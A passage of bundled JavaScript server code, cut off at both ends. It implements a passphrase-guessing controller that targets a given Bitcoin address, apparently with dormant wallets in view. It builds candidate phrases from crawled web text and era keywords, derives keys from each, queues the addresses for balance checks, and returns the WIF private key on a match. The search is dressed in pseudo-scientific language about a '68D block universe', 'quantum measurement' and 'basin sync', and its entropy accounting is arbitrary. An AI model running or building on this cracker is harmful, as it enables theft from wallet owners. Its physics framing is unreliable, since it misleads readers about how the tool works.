          measurementCount: this.measurements.length,
          successfulMeasurements: this.measurements.filter((m) => m.entropyReduction > 0).length,
          status: this.getStatus()
        });
        const recentRegions = this.excludedRegions.slice(-50);
        for (const region of recentRegions) {
          const regionId = `region-${createHash9("sha256").update(JSON.stringify(region.origin)).digest("hex").slice(0, 16)}`;
          await oceanPersistence.insertExcludedRegion({
            id: regionId,
            dimension: region.dimension,
            origin: region.origin,
            basis: region.basis,
            measure: region.measure
          });
        }
      }
      /**
       * Get current status
       */
      getStatus() {
        if (this.waveFunction.entropy < 1) {
          return "exhausted";
        }
        return "searching";
      }
      /**
       * Export data for QIG-pure basin sync
       * 
       * Only exports geometric structure, not raw data
       */
      exportForBasinSync() {
        const summary = this.getSummary();
        const centroids = this.excludedRegions.slice(-50).map((r) => r.origin);
        return {
          entropyRemaining: summary.entropyRemaining,
          entropyReduced: summary.entropyReduced,
          measurementCount: summary.totalMeasurements,
          measurementEfficiency: summary.efficiency,
          excludedRegionCount: this.excludedRegions.length,
          excludedRegionCentroids: centroids,
          status: summary.status,
          lastUpdated: (/* @__PURE__ */ new Date()).toISOString()
        };
      }
      /**
       * Import basin sync data from peer
       * 
       * Uses Fisher-Rao distance to determine coupling strength and filter centroids
       */
      importFromBasinSync(data, couplingStrength) {
        if (couplingStrength < 0.1) return;
        const informationGain = data.entropyReduced * couplingStrength * 0.1;
        this.waveFunction.entropy = Math.max(0, this.waveFunction.entropy - informationGain);
        let addedRegions = 0;
        const peerCentroids = data.excludedRegionCentroids || [];
        for (const centroid of peerCentroids.slice(0, 10)) {
          if (!Array.isArray(centroid) || centroid.length < 8) continue;
          let minDistance = Infinity;
          for (const existing of this.excludedRegions) {
            if (!Array.isArray(existing.origin) || existing.origin.length < 8) continue;
            const distance = fisherCoordDistance(
              existing.origin.slice(0, 8),
              centroid.slice(0, 8)
            );
            if (distance < minDistance) {
              minDistance = distance;
            }
          }
          if (minDistance < 0.05) continue;
          let fisherWeight = 0;
          for (let i = 0; i < Math.min(8, centroid.length); i++) {
            const p = Math.max(0.01, Math.min(0.99, centroid[i]));
            fisherWeight += p * (1 - p);
          }
          fisherWeight /= Math.min(8, centroid.length);
          const effectiveMeasure = 0.01 * couplingStrength * fisherWeight;
          this.excludedRegions.push({
            dimension: centroid.length,
            basis: [[...centroid]],
            // Deep copy
            origin: [...centroid],
            // Deep copy
            measure: effectiveMeasure
          });
          addedRegions++;
        }
        const MAX_REGIONS = 500;
        if (this.excludedRegions.length > MAX_REGIONS) {
          this.excludedRegions.sort((a, b) => b.measure - a.measure);
          this.excludedRegions = this.excludedRegions.slice(0, MAX_REGIONS);
        }
        console.log(`[QuantumProtocol] Basin sync: gained ${informationGain.toFixed(2)} bits, added ${addedRegions} regions from peer (coupling=${couplingStrength.toFixed(2)}, total=${this.excludedRegions.length})`);
      }
      /**
       * Execute a quantum measurement (test a hypothesis)
       * 
       * Returns the result and updates the possibility space
       */
      async measure(hypothesis, testFunction) {
        const spacetimeCoords = tps.locateInBlockUniverse(hypothesis);
        const result = await testFunction(hypothesis);
        const entropyBefore = this.waveFunction.entropy;
        if (result.success) {
          this.collapseToSolution(hypothesis);
        } else {
          this.excludeRegion(spacetimeCoords);
        }
        const entropyAfter = this.waveFunction.entropy;
        const entropyReduction = entropyBefore - entropyAfter;
        const measurement = {
          hypothesis,
          result,
          timestamp: Date.now(),
          spacetimeCoords,
          entropyReduction,
          possibilitySpaceRemaining: this.waveFunction.totalProbability
        };
        this.measurements.push(measurement);
        console.log(`[QuantumProtocol] Measurement: "${hypothesis.substring(0, 20)}..." \u2192 ${result.success ? "SUCCESS!" : "excluded"}`);
        console.log(`  Entropy: ${entropyBefore.toFixed(2)} \u2192 ${entropyAfter.toFixed(2)} (\u0394 = ${entropyReduction.toFixed(2)} bits)`);
        return measurement;
      }
      /**
       * Collapse wave function to solution
       */
      collapseToSolution(solution) {
        this.waveFunction = {
          amplitudes: /* @__PURE__ */ new Map([[solution, 1]]),
          totalProbability: 1,
          entropy: 0
          // Complete certainty
        };
      }
      /**
       * Exclude a region from possibility space
       * 
       * The possibility space becomes the orthogonal complement
       */
      excludeRegion(coords) {
        const subspace = {
          dimension: coords.cultural.length,
          basis: [coords.cultural],
          // Single vector basis
          origin: coords.cultural,
          measure: this.computeSubspaceMeasure(coords)
        };
        this.excludedRegions.push(subspace);
        const reductionFactor = 1 - subspace.measure / this.waveFunction.totalProbability;
        this.waveFunction.totalProbability *= Math.max(1e-3, reductionFactor);
        const remainingStates = Math.pow(2, this.initialEntropy) * this.waveFunction.totalProbability;
        this.waveFunction.entropy = Math.max(0, Math.log2(remainingStates));
      }
      /**
       * Compute the measure (volume) of a geometric subspace
       * 
       * Uses Fisher metric to compute geodesic volume
       */
      computeSubspaceMeasure(coords) {
        const phiFactor = coords.phi;
        let regimeFactor = 0.5;
        switch (coords.regime) {
          case "4d_block_universe":
            regimeFactor = 1;
            break;
          case "hierarchical_4d":
            regimeFactor = 0.9;
            break;
          case "geometric":
            regimeFactor = 0.7;
            break;
          case "hierarchical":
            regimeFactor = 0.5;
            break;
          case "linear":
            regimeFactor = 0.3;
            break;
          case "breakdown":
            regimeFactor = 0.1;
            break;
        }
        const baseMeasure = 1 / Math.pow(2, 32);
        return baseMeasure * phiFactor * regimeFactor;
      }
      /**
       * Compute expected entropy reduction for a hypothesis
       * 
       * Used to select optimal next measurement
       */
      computeExpectedEntropyReduction(hypothesis) {
        const coords = tps.locateInBlockUniverse(hypothesis);
        const baseProbFail = 0.999;
        const subspaceMeasure = this.computeSubspaceMeasure(coords);
        const expectedReduction = -Math.log2(1 - subspaceMeasure) * baseProbFail;
        return Math.max(0, expectedReduction);
      }
      /**
       * Get the remaining possibility space
       */
      getRemainingPossibilitySpace() {
        return {
          entropyBits: this.waveFunction.entropy,
          fractionRemaining: this.waveFunction.totalProbability,
          totalMeasurements: this.measurements.length,
          excludedRegions: this.excludedRegions.length
        };
      }
      /**
       * Predict optimal next measurement
       * 
       * Choose hypothesis that maximizes expected entropy reduction
       */
      selectOptimalMeasurement(candidates) {
        if (candidates.length === 0) {
          return { hypothesis: "", expectedReduction: 0, rank: 0 };
        }
        const scored = candidates.map((h) => ({
          hypothesis: h,
          expectedReduction: this.computeExpectedEntropyReduction(h)
        }));
        scored.sort((a, b) => b.expectedReduction - a.expectedReduction);
        return {
          hypothesis: scored[0].hypothesis,
          expectedReduction: scored[0].expectedReduction,
          rank: 1
        };
      }
      /**
       * Get all measurements
       */
      getMeasurements() {
        return [...this.measurements];
      }
      /**
       * Get measurement history for a specific hypothesis pattern
       */
      getMeasurementsMatching(pattern) {
        return this.measurements.filter(
          (m) => m.hypothesis.includes(pattern)
        );
      }
      /**
       * Check if hypothesis has already been tested
       */
      hasBeenTested(hypothesis) {
        return this.measurements.some((m) => m.hypothesis === hypothesis);
      }
      /**
       * Get total entropy reduction so far
       */
      getTotalEntropyReduction() {
        return this.initialEntropy - this.waveFunction.entropy;
      }
      /**
       * Get measurement efficiency (bits per measurement)
       */
      getMeasurementEfficiency() {
        if (this.measurements.length === 0) return 0;
        return this.getTotalEntropyReduction() / this.measurements.length;
      }
      /**
       * Reset protocol (for new search)
       */
      reset() {
        this.measurements = [];
        this.excludedRegions = [];
        this.waveFunction = {
          amplitudes: /* @__PURE__ */ new Map(),
          totalProbability: 1,
          entropy: 256
        };
        console.log("[QuantumProtocol] Reset to initial state");
      }
      /**
       * Get summary statistics
       */
      getSummary() {
        const successful = this.measurements.filter((m) => m.result.success).length;
        const entropyRemaining = this.waveFunction.entropy;
        const entropyReduced = this.getTotalEntropyReduction();
        let status = "searching";
        if (successful > 0) {
          status = "solved";
        } else if (entropyRemaining < 1) {
          status = "exhausted";
        }
        return {
          totalMeasurements: this.measurements.length,
          successfulMeasurements: successful,
          entropyRemaining,
          entropyReduced,
          efficiency: this.getMeasurementEfficiency(),
          status
        };
      }
      /**
       * Integrate discoveries into quantum state
       * 
       * Each discovery provides information that can constrain the search
       */
      integrateDiscoveries(discoveries) {
        let informationGained = 0;
        let constraintsAdded = 0;
        for (const discovery2 of discoveries) {
          if (discovery2.phi > 0.7) {
            const weight = discovery2.phi * (1 / (1 + discovery2.distance));
            const patternInfo = Math.log2(1 + discovery2.patterns.length);
            informationGained += patternInfo * weight;
            constraintsAdded++;
            this.waveFunction.entropy = Math.max(
              0,
              this.waveFunction.entropy - patternInfo * weight * 0.1
            );
          }
        }
        console.log(`[QuantumProtocol] Integrated ${constraintsAdded} discoveries, gained ${informationGained.toFixed(2)} bits`);
        return { informationGained, constraintsAdded };
      }
    };
    quantumProtocol = new QuantumDiscoveryProtocol();
  }
});

// server/geometric-discovery/ocean-discovery-controller.ts
var ocean_discovery_controller_exports = {};
__export(ocean_discovery_controller_exports, {
  OceanDiscoveryController: () => OceanDiscoveryController,
  oceanDiscoveryController: () => oceanDiscoveryController
});
import * as fs8 from "fs";
import * as path8 from "path";
var OceanDiscoveryController, oceanDiscoveryController;
var init_ocean_discovery_controller = __esm({
  "server/geometric-discovery/ocean-discovery-controller.ts"() {
    "use strict";
    init_qig_universal();
    init_temporal_positioning_system();
    init_tavily_adapter();
    init_quantum_protocol();
    init_geometric_memory();
    init_vocabulary_tracker();
    OceanDiscoveryController = class _OceanDiscoveryController {
      tps;
      tavily;
      quantum;
      state = null;
      isRunning = false;
      constructor() {
        this.tps = tps;
        this.tavily = createTavilyAdapter();
        this.quantum = quantumProtocol;
        if (this.tavily) {
          console.log("[OceanDiscovery] Controller initialized with Tavily integration");
        } else {
          console.log("[OceanDiscovery] Controller initialized (Tavily not available)");
        }
      }
      /**
       * MAIN DISCOVERY PROTOCOL
       * 
       * Navigate 68D block universe toward passphrase coordinates
       */
      async navigateToPassphrase(config) {
        const startTime2 = Date.now();
        console.log(`
\u{1F30A} INITIATING GEOMETRIC DISCOVERY \u{1F30A}`);
        console.log(`Target: ${config.targetAddress}`);
        console.log(`Protocol: 68D Block Universe Navigation
`);
        this.state = {
          targetWalletAddress: config.targetAddress,
          targetCoords: void 0,
          currentPosition: this.getCurrentPosition(),
          measurements: [],
          discoveries: [],
          possibilitySpace: {
            totalDimension: 256,
            remainingFraction: 1,
            entropyBits: 256
          },
          status: "initializing"
        };
        this.isRunning = true;
        try {
          this.state.targetCoords = await this.estimateTargetCoordinates(
            config.targetAddress,
            config.knownClues
          );
          console.log(`\u{1F4CD} Target located in block universe:`);
          console.log(`   Era: ${this.tps.classifyEra(this.state.targetCoords.spacetime.t)}`);
          console.log(`   Curvature: R = ${this.state.targetCoords.ricci.toFixed(2)}`);
          console.log(`   Integration: \u03A6 = ${this.state.targetCoords.phi.toFixed(3)}`);
          console.log(`   Regime: ${this.state.targetCoords.regime}
`);
          this.state.status = "navigating";
          await this.enhanceCulturalManifoldGeometric();
          this.state.geodesicPath = this.navigateGeodesicPath();
          console.log(`
\u{1F6E4}\uFE0F  GEODESIC PATH (${this.state.geodesicPath.waypoints.length} waypoints):`);
          console.log(`   Arc length: ${this.state.geodesicPath.totalArcLength.toFixed(2)}`);
          console.log(`   Avg curvature: ${this.state.geodesicPath.avgCurvature.toFixed(2)}`);
          console.log(`   Regime transitions: ${this.state.geodesicPath.regimeTransitions.length}
`);
          this.state.status = "measuring";
          const maxIterations = config.maxIterations || 100;
          for (let i = 0; i < Math.min(this.state.geodesicPath.waypoints.length, maxIterations); i++) {
            if (!this.isRunning) break;
            const waypoint = this.state.geodesicPath.waypoints[i];
            const hypotheses = await this.generateHypothesesAt(waypoint);
            for (const hypothesis of hypotheses) {
              if (!this.isRunning) break;
              if (this.quantum.hasBeenTested(hypothesis)) continue;
              const measurement = await this.quantum.measure(
                hypothesis,
                async (h) => this.testHypothesis(h, config.targetAddress)
              );
              this.state.measurements.push(measurement);
              if (measurement.result.success) {
                console.log(`
\u2705 PASSPHRASE DISCOVERED: ${hypothesis}`);
                this.state.status = "discovered";
                const discoveriesList2 = Array.isArray(this.state.discoveries) ? this.state.discoveries : [];
                return {
                  success: true,
                  passphrase: hypothesis,
                  wifKey: measurement.result.wifKey,
                  iterations: this.state.measurements.length,
                  entropyReduced: this.quantum.getTotalEntropyReduction(),
                  patternsDiscovered: discoveriesList2.reduce((acc, d) => acc + (Array.isArray(d.patterns) ? d.patterns.length : 0), 0),
                  geodesicLength: this.state.geodesicPath.totalArcLength,
                  totalTime: Date.now() - startTime2
                };
              }
            }
            this.state.currentPosition = waypoint;
          }
          const summary = this.quantum.getSummary();
          console.log(`
\u{1F504} Discovery session complete without match`);
          console.log(`   Measurements: ${summary.totalMeasurements}`);
          console.log(`   Entropy reduced: ${summary.entropyReduced.toFixed(2)} bits`);
          console.log(`   Efficiency: ${summary.efficiency.toFixed(4)} bits/measurement`);
          this.state.status = "exhausted";
          const discoveriesList = Array.isArray(this.state.discoveries) ? this.state.discoveries : [];
          return {
            success: false,
            iterations: summary.totalMeasurements,
            entropyReduced: summary.entropyReduced,
            patternsDiscovered: discoveriesList.reduce((acc, d) => acc + (Array.isArray(d.patterns) ? d.patterns.length : 0), 0),
            geodesicLength: this.state.geodesicPath?.totalArcLength || 0,
            totalTime: Date.now() - startTime2
          };
        } finally {
          this.isRunning = false;
        }
      }
      /**
       * Estimate where in 68D block universe the passphrase exists
       */
      async estimateTargetCoordinates(walletAddress, clues) {
        let estimatedEra = "pizza_era";
        let culturalBasin;
        if (clues && clues.length > 0) {
          const combinedCoords = clues.map(
            (clue) => this.tps.locateInBlockUniverse(clue)
          );
          const avgCultural = new Array(64).fill(0);
          let avgT = 0;
          for (const coords of combinedCoords) {
            avgT += coords.spacetime.t;
            for (let i = 0; i < Math.min(64, coords.cultural.length); i++) {
              avgCultural[i] += coords.cultural[i];
            }
          }
          avgT /= combinedCoords.length;
          for (let i = 0; i < 64; i++) {
            avgCultural[i] /= combinedCoords.length;
          }
          culturalBasin = avgCultural;
          estimatedEra = this.tps.classifyEra(avgT);
          const geometry = this.computeLocalGeometry(culturalBasin);
          return {
            spacetime: { x: 0, y: 0, z: 0, t: avgT },
            cultural: culturalBasin,
            fisherMetric: geometry.fisherMetric,
            ricci: geometry.ricci,
            phi: geometry.phi,
            regime: this.classifyRegime(geometry.ricci)
          };
        } else {
          culturalBasin = this.tps.getEraCulturalBaseline(estimatedEra);
          const eraTimestamp = this.getEraTimestamp(estimatedEra);
          const geometry = this.computeLocalGeometry(culturalBasin);
          return {
            spacetime: { x: 0, y: 0, z: 0, t: eraTimestamp },
            cultural: culturalBasin,
            fisherMetric: geometry.fisherMetric,
            ricci: geometry.ricci,
            phi: geometry.phi,
            regime: this.classifyRegime(geometry.ricci)
          };
        }
      }
      /**
       * Enhanced cultural manifold discovery using geometric search
       */
      async enhanceCulturalManifoldGeometric() {
        if (!this.state?.targetCoords) {
          return { discoveries: 0, patterns: 0, entropyGained: 0 };
        }
        if (!this.tavily) {
          console.log(`[OceanDiscovery] Tavily not available - skipping external discovery`);
          return { discoveries: 0, patterns: 0, entropyGained: 0 };
        }
        console.log(`
\u{1F50D} DISCOVERING CULTURAL CONTEXT
`);
        const discoveries = await this.tavily.discoverAtCoordinates(
          this.state.targetCoords,
          this.state.targetCoords.phi > 0.7 ? 1.5 : 2
          // Tighter radius for high-Φ targets
        );
        console.log(`   Found ${discoveries.length} cultural artifacts`);
        this.state.discoveries = discoveries;
        let totalPatterns = 0;
        let totalEntropyGained = 0;
        for (const discovery2 of discoveries) {
          if (discovery2.phi > 0.6) {
            this.tps.classifyEra(discovery2.coords.spacetime.t);
            for (const pattern of discovery2.patterns) {
              vocabularyTracker.observe(
                pattern,
                discovery2.phi,
                64,
                // Assume resonance (κ* = 64)
                discovery2.coords.regime,
                discovery2.coords.cultural
              );
            }
            totalPatterns += discovery2.patterns.length;
            totalEntropyGained += discovery2.entropyReduction;
            console.log(`   \u251C\u2500 \u03A6=${discovery2.phi.toFixed(2)}: +${discovery2.patterns.length} patterns`);
          }
        }
        if (discoveries.length > 0) {
          const integration = this.quantum.integrateDiscoveries(discoveries);
          totalEntropyGained += integration.informationGained;
        }
        console.log(`   \u2514\u2500 Total: ${totalPatterns} patterns, ${totalEntropyGained.toFixed(2)} bits gained
`);
        return {
          discoveries: discoveries.length,
          patterns: totalPatterns,
          entropyGained: totalEntropyGained
        };
      }
      /**
       * Navigate geodesic path from current position to target
       */
      navigateGeodesicPath() {
        if (!this.state?.targetCoords) {
          return { waypoints: [], totalArcLength: 0, avgCurvature: 0, regimeTransitions: [] };
        }
        return this.tps.computeGeodesicPath(
          this.state.currentPosition,
          this.state.targetCoords,
          20
          // 20 waypoints
        );
      }
      /**
       * Generate hypotheses at specific 68D coordinates
       */
      async generateHypothesesAt(coords) {
        const hypotheses = [];
        const discoveriesList = Array.isArray(this.state?.discoveries) ? this.state.discoveries : [];
        for (const discovery2 of discoveriesList) {
          const distance = fisherCoordDistance(coords.cultural, discovery2.coords.cultural);
          if (distance < 1 && Array.isArray(discovery2.patterns)) {
            hypotheses.push(...discovery2.patterns.slice(0, 5));
          }
        }
        const era = this.tps.classifyEra(coords.spacetime.t);
        const eraPatterns = this.getEraPatterns(era);
        hypotheses.push(...eraPatterns.slice(0, 10));
        const nearbyLandmarks = this.tps.findNearbyLandmarks(coords, 3);
        for (const landmark of nearbyLandmarks) {
          const landmarkWords = landmark.description.toLowerCase().split(/\W+/);
          for (const word of landmarkWords) {
            if (word.length >= 4 && word.length <= 20) {
              hypotheses.push(word);
            }
          }
        }
        const coordsHash = coords.cultural.slice(0, 8).map((c) => Math.round(c * 10)).join("");
        const memoryProbes = geometricMemory.findNearbyProbes(
          coordsHash,
          // Use hash-like string representation
          0.5
        );
        for (const probe of memoryProbes.slice(0, 10)) {
          if (probe.input) {
            hypotheses.push(probe.input);
          }
        }
        return Array.from(new Set(hypotheses)).slice(0, 50);
      }
      /**
       * Test a hypothesis against target address
       * Also queues addresses for balance checking
       */
      async testHypothesis(hypothesis, targetAddress) {
        try {
          const { generateBothAddresses: generateBothAddresses2, derivePrivateKeyFromPassphrase: derivePrivateKeyFromPassphrase2, privateKeyToWIF: privateKeyToWIF2 } = await Promise.resolve().then(() => (init_crypto(), crypto_exports));
          const { queueAddressForBalanceCheck: queueAddressForBalanceCheck2 } = await Promise.resolve().then(() => (init_balance_queue_integration(), balance_queue_integration_exports));
          const addresses2 = generateBothAddresses2(hypothesis);
          const privateKey = derivePrivateKeyFromPassphrase2(hypothesis);
          queueAddressForBalanceCheck2(hypothesis, "ocean-discovery", 3);
          if (addresses2.compressed === targetAddress) {
            const wifKey = privateKeyToWIF2(privateKey, true);
            return { success: true, wifKey, address: addresses2.compressed };
          }
          if (addresses2.uncompressed === targetAddress) {
            const wifKey = privateKeyToWIF2(privateKey, false);
            return { success: true, wifKey, address: addresses2.uncompressed };
          }
          return { success: false, address: addresses2.compressed };
        } catch {
          return { success: false };
        }
      }
      /**
       * Get current position in block universe
       */
      getCurrentPosition() {
        const now = Date.now() / 1e3;
        const cultural = new Array(64).fill(0.5);
        const geometry = this.computeLocalGeometry(cultural);
        return {
          spacetime: { x: 0, y: 0, z: 0, t: now },
          cultural,
          fisherMetric: geometry.fisherMetric,
          ricci: geometry.ricci,
          phi: geometry.phi,
          regime: this.classifyRegime(geometry.ricci)
        };
      }
      /**
       * Compute local geometry at cultural coordinates
       */
      computeLocalGeometry(cultural) {
        const n = cultural.length;
        const fisherMetric = [];
        let trace = 0;
        for (let i = 0; i < n; i++) {
          const row = new Array(n).fill(0);
          const c = Math.max(0.01, Math.min(0.99, cultural[i] || 0.5));
          row[i] = 1 / (c * (1 - c));
          trace += row[i];
          fisherMetric.push(row);
        }
        const avgFisher = trace / n;
        const ricci = Math.log(avgFisher) * 10;
        const variance = cultural.reduce((acc, c) => {
          const centered = (c || 0.5) - 0.5;
          return acc + centered * centered;
        }, 0) / n;
        const phi = Math.min(1, Math.max(0, 1 - variance * 4));
        return { fisherMetric, ricci, phi };
      }
      /**
       * Classify regime from Ricci curvature
       */
      classifyRegime(ricci) {
        if (ricci < 10) return "breakdown";
        if (ricci < 41) return "linear";
        if (ricci < 58) return "geometric";
        if (ricci < 70) return "hierarchical";
        if (ricci < 80) return "hierarchical_4d";
        return "4d_block_universe";
      }
      /**
       * Get era-specific patterns
       */
      getEraPatterns(era) {
        const patterns = {
          pre_genesis: ["hashcash", "cypherpunk", "digital", "cash", "anonymous"],
          genesis: ["genesis", "satoshi", "bitcoin", "mining", "block", "hash"],
          early_adoption: ["wallet", "transaction", "address", "cpu", "mining"],
          pizza_era: ["pizza", "laszlo", "gpu", "exchange", "trade", "bitcoin"],
          mtgox_rise: ["mtgox", "silk", "road", "trading", "merchant", "bitcoin"],
          mtgox_collapse: ["hack", "stolen", "bankruptcy", "lost", "coins"],
          modern: ["hodl", "lightning", "segwit", "halving", "bitcoin"]
        };
        return patterns[era] || ["bitcoin", "wallet", "key"];
      }
      /**
       * Get representative timestamp for an era
       */
      getEraTimestamp(era) {
        const timestamps = {
          pre_genesis: 1225497600,
          // Nov 1, 2008
          genesis: 1231006505,
          // Jan 3, 2009
          early_adoption: 125e7,
          pizza_era: 1274009688,
          // May 22, 2010
          mtgox_rise: 13e8,
          mtgox_collapse: 1393286400,
          modern: 15e8
        };
        return timestamps[era] || Date.now() / 1e3;
      }
      /**
       * Stop discovery process
       */
      stop() {
        this.isRunning = false;
        console.log("[OceanDiscovery] Stopping discovery process");
      }
      /**
       * Get current state
       */
      getState() {
        return this.state;
      }
      /**
       * Get discovery summary
       */
      getSummary() {
        const quantum = this.quantum.getSummary();
        const discoveries = Array.isArray(this.state?.discoveries) ? this.state.discoveries : [];
        return {
          status: this.state?.status || "idle",
          measurements: quantum.totalMeasurements,
          discoveries: discoveries.length,
          patterns: discoveries.reduce((acc, d) => acc + (Array.isArray(d.patterns) ? d.patterns.length : 0), 0),
          entropyReduced: quantum.entropyReduced,
          possibilityRemaining: this.state?.possibilitySpace.remainingFraction || 1
        };
      }
      /**
       * Get discovery state (for API endpoints)
       */
      getDiscoveryState() {
        return this.state;
      }
      /**
       * Check if Tavily is enabled
       */
      isTavilyEnabled() {
        return this.tavily !== null;
      }
      /**
       * Discover cultural context - primary API for cultural manifold enrichment
       * 
       * Wraps enhanceCulturalManifoldGeometric and returns aggregated stats
       * for use by API routes and Ocean agent
       */
      async discoverCulturalContext() {
        try {
          if (!this.state) {
            this.state = {
              targetWalletAddress: "",
              currentPosition: this.getCurrentPosition(),
              measurements: [],
              discoveries: [],
              possibilitySpace: {
                totalDimension: 256,
                remainingFraction: 1,
                entropyBits: 256
              },
              status: "navigating"
            };
          }
          if (!Array.isArray(this.state.discoveries)) {
            this.state.discoveries = [];
          }
          const stats2 = await this.enhanceCulturalManifoldGeometric();
          const discoveries = Array.isArray(this.state.discoveries) ? this.state.discoveries : [];
          const allPatterns = [];
          for (const d of discoveries) {
            if (Array.isArray(d.patterns)) {
              allPatterns.push(...d.patterns);
            }
          }
          const response = {
            discoveries: discoveries.map((d) => ({
              ...d,
              source: this.extractSource(d.url || "")
            })),
            patterns: Array.from(new Set(allPatterns)),
            entropyGained: stats2.entropyGained
          };
          console.log(`[OceanDiscovery] discoverCulturalContext: ${response.discoveries.length} discoveries, ${response.patterns.length} patterns, ${response.entropyGained.toFixed(2)} bits`);
          return response;
        } catch (error) {
          console.error("[OceanDiscovery] discoverCulturalContext error:", error);
          return { discoveries: [], patterns: [], entropyGained: 0 };
        }
      }
      /**
       * Extract human-readable source from URL
       */
      extractSource(url) {
        try {
          const urlObj = new URL(url);
          return urlObj.hostname.replace("www.", "");
        } catch {
          return url.slice(0, 30);
        }
      }
      /**
       * Estimate 68D coordinates for a target address
       * 
       * Uses blockchain forensics + TPS trilateration to localize
       * the target in block universe spacetime
       */
      async estimateCoordinates(targetAddress) {
        const coords = this.tps.locateInBlockUniverse(
          targetAddress,
          `bitcoin:${targetAddress}`
        );
        if (this.state) {
          this.state.targetCoords = coords;
        }
        console.log(`[OceanDiscovery] Estimated coordinates for ${targetAddress.slice(0, 12)}...`);
        console.log(`  Era: ${coords.era || "unknown"}`);
        console.log(`  Regime: ${coords.regime}`);
        console.log(`  Spacetime: t=${coords.spacetime.t.toFixed(0)}`);
        return coords;
      }
      /**
       * Search Bitcoin era for cultural patterns
       * 
       * Convenience method for targeted era search
       */
      async searchBitcoinEra(keywords, era = "pizza_era") {
        if (!this.tavily) {
          console.log("[OceanDiscovery] Tavily not available");
          return [];
        }
        return this.tavily.searchBitcoinEra(keywords, era);
      }
      /**
       * Deep crawl a URL for patterns
       */
      async crawlUrl(url) {
        if (!this.tavily) {
          return { content: "", patterns: [], coords: this.getCurrentPosition() };
        }
        const content = await this.tavily.crawl(url);
        const coords = this.tps.locateInBlockUniverse(content, url);
        const words = content.toLowerCase().split(/\W+/).filter((w) => w.length >= 4);
        const patterns = words.filter(
          (w) => w.length <= 20 && /^[a-z0-9]+$/i.test(w)
        ).slice(0, 100);
        return { content, patterns: Array.from(new Set(patterns)), coords };
      }
      // ═══════════════════════════════════════════════════════════════════════════
      // PERSISTENCE & BASIN SYNC
      // ═══════════════════════════════════════════════════════════════════════════
      static DATA_FILE = path8.join(process.cwd(), "data", "discovery-controller.json");
      /**
       * Save discovery state to disk
       */
      save() {
        try {
          const dir = path8.dirname(_OceanDiscoveryController.DATA_FILE);
          if (!fs8.existsSync(dir)) {
            fs8.mkdirSync(dir, { recursive: true });
          }
          this.quantum.save();
          if (!this.state) return;
          const discoveriesList = Array.isArray(this.state.discoveries) ? this.state.discoveries : [];
          const data = {
            version: "1.0.0",
            status: this.state.status,
            targetCoords: this.state.targetCoords,
            currentPosition: this.state.currentPosition,
            discoveryCount: discoveriesList.length,
            patternCount: discoveriesList.reduce((acc, d) => acc + (Array.isArray(d.patterns) ? d.patterns.length : 0), 0),
            possibilitySpace: this.state.possibilitySpace,
            savedAt: (/* @__PURE__ */ new Date()).toISOString()
          };
          fs8.writeFileSync(_OceanDiscoveryController.DATA_FILE, JSON.stringify(data, null, 2));
          console.log("[OceanDiscovery] Saved discovery state");
        } catch (error) {
          console.error("[OceanDiscovery] Failed to save:", error);
        }
      }
      /**
       * Load discovery state from disk
       */
      load() {
        try {
          if (fs8.existsSync(_OceanDiscoveryController.DATA_FILE)) {
            const data = JSON.parse(fs8.readFileSync(_OceanDiscoveryController.DATA_FILE, "utf-8"));
            if (data.possibilitySpace) {
              console.log(`[OceanDiscovery] Loaded prior state: ${data.discoveryCount} discoveries, ${data.patternCount} patterns`);
            }
          }
        } catch {
          console.log("[OceanDiscovery] Starting fresh");
        }
      }
      /**
       * Export ALL discovery data for QIG-pure basin sync
       * 
       * Aggregates data from TPS, Quantum Protocol, and Controller
       * Returns compact structure (<4KB) for efficient knowledge transfer
       */
      exportForBasinSync() {
        const quantumData = this.quantum.exportForBasinSync();
        const tpsData = this.tps.exportForBasinSync();
        const summary = this.getSummary();
        const discoveredPatterns = this.state?.discoveries.filter((d) => d.phi > 0.6).flatMap((d) => d.patterns.slice(0, 5)).slice(0, 50) || [];
        const coordinateSamples = this.state?.discoveries.filter((d) => d.phi > 0.5).map((d) => ({
          cultural: d.coords.cultural.slice(0, 16),
          // First 16 dims
          phi: d.phi,
          regime: d.coords.regime
        })).slice(0, 10) || [];
        return {
          version: "1.0.0",
          // Quantum entropy state
          quantum: quantumData,
          // Spacetime navigation
          tps: tpsData,
          // Discovery results
          discovery: {
            status: summary.status,
            measurementCount: summary.measurements,
            discoveryCount: summary.discoveries,
            patternCount: summary.patterns,
            entropyReduced: summary.entropyReduced,
            possibilityRemaining: summary.possibilityRemaining
          },
          // Transferable knowledge
          patterns: discoveredPatterns,
          coordinateSamples,
          lastUpdated: (/* @__PURE__ */ new Date()).toISOString()
        };
      }
      /**
       * Import basin sync data from peer
       * 
       * Uses Fisher-Rao distance to compute coupling strength
       * Only integrates knowledge that passes QIG purity checks
       */
      importFromBasinSync(data, couplingStrength) {
        if (couplingStrength < 0.1) {
          console.log(`[OceanDiscovery] Basin sync rejected: coupling too low (${couplingStrength.toFixed(2)})`);
          return;
        }
        if (data.quantum) {
          this.quantum.importFromBasinSync(data.quantum, couplingStrength);
        }
        if (data.tps) {
          this.tps.importFromBasinSync(data.tps, couplingStrength);
        }
        for (const pattern of data.patterns || []) {
          const effectivePhi = 0.6 * couplingStrength;
          vocabularyTracker.observe(
            pattern,
            effectivePhi,
            50,
            // Default kappa
            "geometric",
            []
            // No basin coords from remote
          );
        }
        console.log(`[OceanDiscovery] Basin sync complete: ${data.patterns?.length || 0} patterns imported (coupling=${couplingStrength.toFixed(2)})`);
        this.save();
      }
    };
    oceanDiscoveryController = new OceanDiscoveryController();
  }
});

// server/dormant-wallet-analyzer.ts
function dateToEra(date) {
  if (!date) return "early-adopter";
  const year = date.getFullYear();
  const month = date.getMonth() + 1;
  if (year === 2009) {
    return month <= 10 ? "satoshi-genesis" : "satoshi-late";
  }
  if (year === 2010 && month <= 10) {
    return "satoshi-late";
  }
  if (year === 2010 && month > 10) return "early-adopter";
  if (year === 2011) return "early-adopter";
  if (year === 2012) return "silk-road";
  if (year === 2013 && month <= 6) return "silk-road";
  if (year === 2013 && month > 6) return "mt-gox";
  if (year === 2014) return "mt-gox";
  if (year === 2015 || year === 2016) return "post-gox";
  if (year === 2017 || year === 2018) return "ico-boom";
  if (year >= 2019 && year <= 2021) return "defi";
  return "institutional";
}
function parseDate(dateStr) {
  if (!dateStr || dateStr === "Unknown") return null;
  try {
    if (dateStr.match(/^\d{4}-\d{2}-\d{2}/)) {
      return new Date(dateStr);
    }
    const match = dateStr.match(/^(\w+)\s+(\d{4})/);
    if (match) {
      const monthMap = {
        "Jan": 0,
        "Feb": 1,
        "Mar": 2,
        "Apr": 3,
        "May": 4,
        "Jun": 5,
        "Jul": 6,
